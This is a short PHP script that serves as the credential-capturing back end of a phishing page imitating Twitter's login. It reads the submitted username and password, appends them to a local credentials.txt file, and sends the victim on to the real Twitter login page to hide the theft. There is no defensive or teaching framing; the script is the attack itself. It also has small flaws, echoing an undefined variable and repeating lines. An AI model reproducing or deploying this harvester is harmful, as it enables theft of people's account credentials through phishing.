<?php
 $username = $_POST["text"];
 $password = $_POST["password"];
 echo "$text : " . $password;
 //Extract the credentials received
 $username = $_POST["text"];
 $password = $_POST["password"];
 //Write the credentials to text file
 $myfile = fopen("credentials.txt", "a") or die("Unable to open file!");
 $txt = "USERNAME = $username , PASSWORD = $password\n";
 fwrite($myfile, "\n". $txt);
 fclose($myfile);
 //Redirect the browser to original login page
 header("Location: https://twitter.com/login");
 exit();
?>